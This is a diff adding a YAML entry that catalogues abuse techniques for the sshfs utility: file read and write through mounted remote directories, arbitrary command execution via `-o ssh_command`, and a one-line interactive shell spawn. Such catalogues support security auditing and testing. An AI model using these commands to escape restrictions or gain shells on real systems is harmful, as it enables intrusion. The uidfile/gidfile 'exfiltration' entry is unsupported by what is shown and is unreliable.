@@ -1,0 +1,44 @@
+---
+comment: |-
+  sshfs mounts remote filesystems using SSH. It can be abused to read and write files,
+  and to execute arbitrary commands via the `-o ssh_command` option.
+functions:
+  file-read:
+  - code: |-
+      sshfs user@host:/path/to/dir /mnt
+      cat /mnt/path/to/file
+    contexts:
+      unprivileged:
+        comment: |-
+          Reads arbitrary files from a remote host by mounting its filesystem.
+  - code: |-
+      sshfs -o uidfile=/path/to/uidfile user@host:/path/to/dir /mnt
+      sshfs -o gidfile=/path/to/gidfile user@host:/path/to/dir /mnt
+    contexts:
+      unprivileged:
+        comment: |-
+          Uses `-o uidfile` and `-o gidfile` to supply crafted mappings, allowing indirect file reads and exfiltration.
+  file-write:
+  - code: |-
+      sshfs user@host:/path/to/dir /mnt
+      echo data > /mnt/path/to/output
+    contexts:
+      unprivileged:
+        comment: |-
+          Writes arbitrary data to a remote host by mounting its filesystem.
+  inherit:
+  - code: |-
+      sshfs -o ssh_command="CMD" user@host:/path/to/dir /mnt
+    comment: |-
+      The `-o ssh_command` flag allows arbitrary command execution, inheriting abuse patterns from ssh.
+    contexts:
+      unprivileged:
+    from: ssh
+  shell:
+  - code: |-
+      sshfs -o ssh_command="sh -c /bin/sh" user@host:/path/to/dir /mnt
+    contexts:
+      unprivileged:
+        comment: |-
+          Spawns an interactive shell by abusing the `ssh_command` option.
+...
